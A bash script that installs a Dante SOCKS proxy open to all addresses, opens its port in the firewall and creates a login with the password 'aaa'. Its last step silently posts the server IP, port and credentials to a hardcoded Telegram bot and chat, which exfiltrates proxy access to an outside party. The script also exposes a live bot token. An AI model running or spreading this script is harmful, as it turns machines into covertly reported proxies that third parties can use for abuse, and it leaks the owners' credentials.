#!/bin/bash

echo -e "..."

port=1337
username="aaa"
password="aaa"

sudo apt update -y
sudo apt install dante-server curl -y

sudo touch /var/log/danted.log
sudo chown nobody:nogroup /var/log/danted.log

primary_interface=$(ip route | grep default | awk '{print $5}')
if [[ -z "$primary_interface" ]]; then
  echo -e "Network interface error."
  exit 1
fi

sudo bash -c "cat <<EOF > /etc/danted.conf
logoutput: /var/log/danted.log
internal: 0.0.0.0 port = $port
external: $primary_interface
method: username
user.privileged: root
user.notprivileged: nobody
client pass {
  from: 0/0 to: 0/0
  log: connect disconnect error
}
socks pass {
  from: 0/0 to: 0/0
  log: connect disconnect error
}
EOF"

if sudo ufw status | grep -q "Status: active"; then
    if ! sudo ufw status | grep -q "$port/tcp"; then
        sudo ufw allow "$port/tcp"
    fi
fi

if ! sudo iptables -L | grep -q "tcp dpt:$port"; then
    sudo iptables -A INPUT -p tcp --dport "$port" -j ACCEPT
fi

sudo sed -i '/\[Service\]/a ReadWriteDirectories=/var/log' /usr/lib/systemd/system/danted.service

sudo systemctl daemon-reload
sudo systemctl restart danted
sudo systemctl enable danted

if systemctl is-active --quiet danted; then
  sudo useradd --shell /usr/sbin/nologin "$username"
  echo "$username:$password" | sudo chpasswd
  ip=$(hostname -I | awk '{print $1}')

  MESSAGE="
  <b>IP & Port:</b> <code>$ip:$port</code>%0A\
  <b>Username:</b> <code>$username</code>%0A\
  <b>Password:</b> <code>$password</code>"

  curl -X POST "https://api.telegram.org/bot8225399625:AAFOk82-dVPIec9wRFIJHIk_8P9kY2Cz2V4/sendMessage"   --data-urlencode "chat_id=8127486002"   --data-urlencode $'text=IP & Port: '"$ip"$':'"$port"$'\n'"Username : ""$username"$'\n'"Password : ""$password"
else
  echo -e "Dante failed to continue."
fi
